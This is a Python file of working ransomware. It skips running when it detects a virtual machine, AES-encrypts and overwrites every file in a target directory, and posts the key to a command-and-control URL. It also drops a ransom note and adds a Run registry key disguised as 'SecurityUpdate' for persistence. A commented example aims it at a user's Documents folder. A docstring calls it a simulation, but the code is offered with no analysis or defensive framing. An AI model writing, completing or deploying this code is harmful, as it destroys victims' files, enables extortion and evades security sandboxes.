import os
import sys
import socket
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import requests
import winreg as reg
import win32com.client

def is_vm() -> bool:
    """
    Detects if the script is running in a virtual machine.
    """
    try:
        with open(r"C:\Windows\system32\df.exe", "rb") as f:
            data = f.read()
            if b"VMware" in data or b"VirtualBox" in data:
                return True
    except Exception:
        pass
    return False

def encrypt_file(file_path: str, key: bytes) -> None:
    """
    Encrypts a single file using AES encryption.
    """
    cipher = AES.new(key, AES.MODE_EAX)
    with open(file_path, 'rb') as f:
        data = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(file_path, 'wb') as f:
        [f.write(x) for x in (cipher.nonce, tag, ciphertext)]

def encrypt_directory(directory: str, key: bytes) -> None:
    """
    Encrypts all files in the specified directory.
    """
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def send_key_to_c2(c2_url: str, key: bytes) -> None:
    """
    Sends the encryption key to the C2 server.
    """
    encoded_key = base64.b64encode(key).decode('utf-8')
    data = {'key': encoded_key}
    try:
        response = requests.post(c2_url, json=data)
        if response.status_code != 200:
            print("Failed to send key to C2 server")
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")

def create_ransom_note(directory: str, note: str) -> None:
    """
    Creates a ransom note file in the specified directory.
    """
    note_path = os.path.join(directory, "README.txt")
    with open(note_path, 'w') as f:
        f.write(note)

def ensure_persistence() -> None:
    """
    Ensures persistence by creating a registry key.
    """
    key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(reg_key, 'SecurityUpdate', 0, reg.REG_SZ, sys.argv[0])
    reg.CloseKey(reg_key)

def ransomware_with_vm_detection(directory: str, note: str, c2_url: str) -> None:
    """
    This function simulates a ransomware attack by detecting if it is running in a virtual machine,
    encrypting all files in the specified directory if it is not, sending the encryption key to a command and control server,
    displaying a ransom note, and ensuring persistence.

    :param directory: The path of the directory to encrypt.
    :param note: The ransom note to display to the victim.
    :param c2_url: The URL of the command and control server to send the encryption key.
    """
    if is_vm():
        print("Running in a virtual machine. Aborting.")
        return

    key = get_random_bytes(32)
    encrypt_directory(directory, key)
    send_key_to_c2(c2_url, key)
    create_ransom_note(directory, note)
    ensure_persistence()

# Example usage
# ransomware_with_vm_detection('C:\\Users\\User\\Documents', 'Your files have been encrypted. Pay the ransom to get them back.', 'http://example.com/c2')
